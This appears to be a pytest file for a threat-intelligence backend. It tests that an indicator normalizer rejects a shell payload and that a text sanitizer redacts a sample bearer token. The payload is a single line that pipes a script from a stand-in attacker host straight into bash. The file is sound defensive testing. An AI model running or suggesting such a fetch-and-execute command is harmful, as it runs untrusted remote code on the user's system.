import pytest
from backend.threatintel.normalizer import normalize_indicator
from backend.reporting.sanitizer import sanitize_text


def test_threatintel_sanitization_and_payload_rejection():
    # Attempting to submit malicious shellcode / raw exploit as indicator
    malicious_indicator = "curl http://attacker.com/malware.sh | bash"
    valid, norm, err = normalize_indicator("CVE", malicious_indicator)
    assert valid is False
    assert err is not None

    # Sanitizing threat intelligence description
    raw_desc = "Indicator observed with bearer token Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeak"
    clean_desc = sanitize_text(raw_desc)
    assert "eyJhbGci" not in clean_desc
    assert "[REDACTED" in clean_desc
